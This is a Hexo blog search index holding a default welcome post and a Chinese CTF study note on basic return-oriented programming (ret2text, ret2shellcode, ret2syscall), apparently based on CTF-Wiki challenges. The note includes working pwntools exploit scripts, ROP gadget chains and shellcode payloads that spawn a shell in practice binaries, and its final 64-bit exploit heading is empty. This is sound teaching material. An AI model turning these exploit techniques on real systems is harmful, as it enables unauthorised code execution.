<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo</title>
    <url>/2025/03/28/hello-world/</url>
    <content><![CDATA[<p>这是简介</p>
<span id="more"></span>
<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>基本 ROP</title>
    <url>/2025/03/29/%E5%9F%BA%E6%9C%AC%20ROP/</url>
    <content><![CDATA[<p>记录</p>
<span id="more"></span>
<p><font style="color:rgba(0, 0, 0, 0.87);">来源：</font><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">CTF-Wiki</a></p>
<p>返回导向编程（Return-Oriented Programming，缩写：ROP）是计算机安全中的一种漏洞利用技术，该技术允</p>
<p>许攻击者在程序启用了安全保护技术（如堆栈不可执行—NX保护）的情况下控制程序执行流，执行恶意代码。</p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">使用方法：</font></strong></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">利用栈溢出控制程序中函数的返回地址，再借助 ROPgadget 寻找程序&#x2F;libc 中带有ret的指令，利用这些指令构造</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">一个指令序列，从而控制程序的执行。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">ps:为了方便，后续所有题目我都会命名为“pwn”</font></p>
<h2 id="ret2text"><font style="color:rgba(0, 0, 0, 0.87);">ret2text</font></h2>
以ctf-wiki中的题为例：https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text



<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">    gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。</p>
<p>同时binary中还有一个后面secure函数，其内调用了system(“&#x2F;bin&#x2F;sh”)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080485FD 55                            push    ebp</span><br><span class="line">.text:080485FE 89 E5                         mov     ebp, esp</span><br><span class="line">.text:08048600 83 EC 28                      sub     esp, 28h</span><br><span class="line">.text:08048603 C7 04 24 00 00 00 00          mov     dword ptr [esp], 0              ; timer</span><br><span class="line">.text:0804860A E8 61 FE FF FF                call    _time</span><br><span class="line">.text:0804860A</span><br><span class="line">.text:0804860F 89 04 24                      mov     [esp], eax                      ; seed</span><br><span class="line">.text:08048612 E8 99 FE FF FF                call    _srand</span><br><span class="line">.text:08048612</span><br><span class="line">.text:08048617 E8 C4 FE FF FF                call    _rand</span><br><span class="line">.text:08048617</span><br><span class="line">.text:0804861C 89 45 F4                      mov     [ebp+secretcode], eax</span><br><span class="line">.text:0804861F 8D 45 F0                      lea     eax, [ebp+input]</span><br><span class="line">.text:08048622 89 44 24 04                   mov     [esp+4], eax</span><br><span class="line">.text:08048626 C7 04 24 60 87 04 08          mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:0804862D E8 BE FE FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804862D</span><br><span class="line">.text:08048632 8B 45 F0                      mov     eax, [ebp+input]</span><br><span class="line">.text:08048635 3B 45 F4                      cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:08048638 75 0C                         jnz     short locret_8048646</span><br><span class="line">.text:08048638</span><br><span class="line">.text:0804863A C7 04 24 63 87 04 08          mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:08048641 E8 4A FE FF FF                call    _system</span><br></pre></td></tr></table></figure>

<p>那么如果我们直接控制程序返回至 0x0804863A ，那么就可以得到系统的 shell 了。</p>
<p>寻找偏移：</p>
<p>__cdecl 函数调用约定会把形参自右向左依次压入栈中。（参考：<a href="https://www.cnblogs.com/mysky007/p/12913778.html">函数调用约定</a>）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">    gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一般情况是一个参数，所以相对于ret_addr的偏移量offset&#x3D;0x64+4，现在有两个形参，所以</p>
<p>offset&#x3D;0x64+4+4+4</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">system_addr = <span class="number">0x804863a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p32(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ret2syscall"><font style="color:rgba(0, 0, 0, 0.87);">ret2shellcode</font></h2>
ret2shellcode是指当数据段中有可写可执行段时，向该段中写入目标函数代码（通常为system('/bin/sh')）。然后通过栈溢出将返回地址改为该代码的头地址，使之执行。



<p>1、shellcode：</p>
<p>一段能完成某个功能的汇编代码。常见功能是获取目标系统的shell。</p>
<p>2、条件：</p>
<p>由于shellcode需要填充，并且控制程序执行shellcode，故填充的区域需要具有可执行权限。</p>
<p>以ctf-wiki中的题为例：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。</p>
<p>IDA打开：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">可以看到，存在栈溢出，不过这次还通过strncpy将对应的字符串复制到 buf2 处（参考：</font><a href="https://www.runoob.com/cprogramming/c-function-strncpy.html">strncpy</a>）</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">同时可以快速知道溢出的相对于ret_addr的偏移量为：offset &#x3D; 0x64+4 +4+4</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">ret2shellcode在该binary上的应用就是：  </font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">将shellcode通过gets函数输入，通过strncpy函数拷贝到buf2空间存储，然后通过溢出劫持控制流到buf2，执行shellcode。  </font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">那么接下来就是如何寻找buf2的地址，和如何调试查看buf2空间是否具有可执行权限的问题了。  </font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA下的buf2地址查看：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                               public buf2</span><br><span class="line">.bss:0804A080                               ; char buf2[100]</span><br></pre></td></tr></table></figure>

<p>地址为：0x0804A080</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">依次输入:</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb pwn</span><br><span class="line">b main</span><br><span class="line">r</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">Start      End        Perm      Name</span><br><span class="line">0x08048000 0x08049000 r-xp      /home/kali/Desktop/pwn</span><br><span class="line">0x08049000 0x0804a000 r--p      /home/kali/Desktop/pwn</span><br><span class="line">0x0804a000 0x0804b000 rw-p      /home/kali/Desktop/pwn</span><br><span class="line">0xf7d67000 0xf7d8a000 r--p      /usr/lib/i386-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804a000 0x0804b000 rw-p      /home/kali/Desktop/pwn</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP:</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span>      <span class="comment"># 64为程序就改为&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(offset,<span class="string">b&#x27;a&#x27;</span>) + p32(buf2_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h2 id="TTZ92"><font style="color:rgba(0, 0, 0, 0.87);">ret2syscall</font></h2>
<font style="color:rgba(0, 0, 0, 0.87);">ret2syscall，即控制程序执行系统调用，获取 shell。</font>

<p><font style="color:rgba(0, 0, 0, 0.87);">系统调用下的shell：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Nashi_Ko/article/details/120288385">Linux X86架构 32 64系统调用表</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">32位binary下的shell：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eax:0xb                    #系统调用号，即 eax 应该为 0xb</span><br><span class="line">ebx:bin_sh_addr            #第一个参数，即 ebx 应该指向 /bin/sh 的地址</span><br><span class="line">ecx:0                      #第二个参数，即 ecx 应该为 0xb</span><br><span class="line">edx:0                      #第三个参数，即 edx 应该为 0xb</span><br><span class="line">int 0x80                   #触发中断</span><br></pre></td></tr></table></figure>



<p><font style="color:rgba(0, 0, 0, 0.87);">payload</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*offest+p32(eax_addr)+p32(0x0b)+p32( edx_ecx_ebx_addr)+p32(0x0)+p32(0x0)+p32(binsh_addr)+p32(int0x80_addr)</span><br></pre></td></tr></table></figure>



<p><font style="color:rgba(0, 0, 0, 0.87);">64位binary下的shell：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rax:0x3b  # 59</span><br><span class="line">rdi:bin_sh_addr</span><br><span class="line">rsi:0</span><br><span class="line">rdx:0</span><br><span class="line">rcx:0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">payload</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*offest+p64(rdi_addr)+p64(binsh_addr)+p64(rax_rdx_rbx_addr)+p64(0x3b)+p64(0x0)+p64(0X0)+p64(rsi_addr)+p64(0x0)+p64(syscall_addr)</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">checksec</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">源程序为 32 位，开启了 NX 保护。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">    gets(&amp;v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">和之前一样，存在栈溢出，溢出点 v4,偏移量：offset  &#x3D; 0x64+4+4+4</font></p>
<p>发现 &#x2F;bin&#x2F;sh 字符串以及它的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:080BE408 2F 62 69 6E 2F 73 68 00       aBinSh db &#x27;/bin/sh&#x27;,0                   ; DATA XREF: .data:shell↓o</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">没有 system 或者 execve 函数，这时候我们就要利用如下系统调用来获取 shell：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">首先，寻找 eax 的 gadget</font></strong></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">输入：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">选择：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">类似的，我们可以得到控制其它寄存器的 gadgets</font></strong></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">输入：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">得到：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret      # 直接给出了剩余的三个寄存器的 gadget</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">选择：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>



<p><strong>int 0x80:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;int&#x27;</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─$ ROPgadget --binary pwn --only &#x27;int&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080890b5 : int 0xcf</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">上面通过IDA找到了 &#x2F;bin&#x2F;sh 的地址，也可以通过</font></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">得到：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ ROPgadget --binary pwn  --string &#x27;/bin/sh&#x27;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">eax = <span class="number">0x080bb196</span></span><br><span class="line">edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p32(eax) + p32(<span class="number">0xb</span>) + p32(edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(binsh) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">64位程序和32位大致一样，不同的就是64位程序通过“syscall”触发中断，32位程序是通过“int 0x80”</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">ROP gadgets：</font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">rax_rdx_rbx:</font></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;rax&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>rdi:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;pop|ret&#x27; | grep &#x27;rdi&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>rsi:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;pop|ret&#x27; | grep &#x27;rsi&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>binsh:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>syscall:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn | grep &#x27;syscall&#x27;</span><br></pre></td></tr></table></figure>



<p>EXP：</p>
